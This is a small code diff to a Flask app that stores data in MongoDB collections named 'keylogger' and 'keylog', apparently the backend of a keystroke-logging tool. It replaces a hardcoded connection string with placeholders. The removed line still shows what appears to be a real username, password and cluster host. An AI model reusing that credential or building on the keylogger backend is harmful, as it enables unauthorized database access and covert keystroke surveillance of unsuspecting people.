@@ -6,7 +6,7 @@ import datetime
 app = Flask(__name__, template_folder=os.path.dirname(os.path.abspath(__file__)))
 
 # MongoDB connection
-client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
+client = pymongo.MongoClient("mongodb+srv://<username>:<password>@keyspy.iarapa1.mongodb.net/") #monogDB Atlas connection link
 # Keylogger database
 keylogger_db = client["keylogger"]
 keylogs_collection = keylogger_db["keylog"]
